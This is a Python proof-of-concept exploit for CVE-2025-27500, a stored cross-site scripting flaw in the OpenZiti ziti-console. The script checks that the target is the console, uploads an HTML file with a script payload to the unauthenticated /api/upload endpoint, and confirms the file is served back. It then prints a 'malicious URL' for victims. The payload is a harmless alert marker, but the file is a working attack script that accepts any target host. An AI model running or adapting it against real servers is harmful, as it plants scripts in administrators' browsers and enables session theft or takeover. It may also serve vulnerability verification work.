#!/usr/bin/env python3
import requests
import sys
import time
import re

TARGET_HOST = "http://localhost:1408"

XSS_PAYLOAD = '<html><body><script>alert("XSS-CVE-2025-27500")</script></body></html>'
PAYLOAD_FILENAME = "xss_test.html"

def banner():
    print("=" * 60)
    print("CVE-2025-27500 - OpenZiti ziti-console Stored XSS PoC")
    print("Unauthenticated file upload leads to stored XSS")
    print("=" * 60)

def check_server():
    print(f"\n[*] Checking if target is accessible: {TARGET_HOST}")
    try:
        resp = requests.get(f"{TARGET_HOST}/", timeout=10)
        if resp.status_code == 200 and "Ziti Admin Console" in resp.text:
            print("[+] Target is running OpenZiti ziti-console")
            return True
        else:
            print("[-] Target does not appear to be ziti-console")
            return False
    except Exception as e:
        print(f"[-] Error connecting to target: {e}")
        return False

def upload_xss_file():
    print("\n[*] Uploading XSS payload without authentication...")
    url = f"{TARGET_HOST}/api/upload"
    
    files = {
        'image': (PAYLOAD_FILENAME, XSS_PAYLOAD, 'text/html')
    }
    data = {
        'resource': 'icon'
    }
    
    try:
        resp = requests.post(url, files=files, data=data, timeout=10)
        if resp.status_code == 200:
            file_path = resp.text.strip()
            print(f"[+] File uploaded successfully!")
            print(f"[+] File accessible at: {TARGET_HOST}{file_path}")
            return file_path
        else:
            print(f"[-] Upload failed with status code: {resp.status_code}")
            print(f"[-] Response: {resp.text}")
            return None
    except Exception as e:
        print(f"[-] Error during upload: {e}")
        return None

def verify_xss(file_path):
    print("\n[*] Verifying uploaded XSS payload...")
    url = f"{TARGET_HOST}{file_path}"
    
    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            if 'alert("XSS-CVE-2025-27500")' in resp.text:
                print("[+] XSS payload verified!")
                print(f"[+] Payload content:\n{resp.text}")
                return True
            else:
                print("[-] Payload not found in response")
                return False
        else:
            print(f"[-] Failed to access uploaded file: {resp.status_code}")
            return False
    except Exception as e:
        print(f"[-] Error verifying payload: {e}")
        return False

def main():
    banner()
    
    if len(sys.argv) > 1:
        global TARGET_HOST
        TARGET_HOST = sys.argv[1].rstrip('/')
    
    if not check_server():
        print("\n[-] FAILED: Target server check failed")
        return 1
    
    file_path = upload_xss_file()
    if not file_path:
        print("\n[-] FAILED: Could not upload XSS payload")
        return 1
    
    if not verify_xss(file_path):
        print("\n[-] FAILED: XSS payload verification failed")
        return 1
    
    print("\n" + "=" * 60)
    print("[+] SUCCESS: CVE-2025-27500 vulnerability confirmed!")
    print("=" * 60)
    print("\nVulnerability Details:")
    print("- The /api/upload endpoint allows unauthenticated file uploads")
    print("- Uploaded files are accessible without authentication")
    print("- An attacker can upload HTML/JS files containing malicious scripts")
    print("- When a user visits the uploaded file URL, the XSS payload executes")
    print(f"\n[!] Malicious URL: {TARGET_HOST}{file_path}")
    print("[!] When visited, JavaScript code will execute in victim's browser")
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
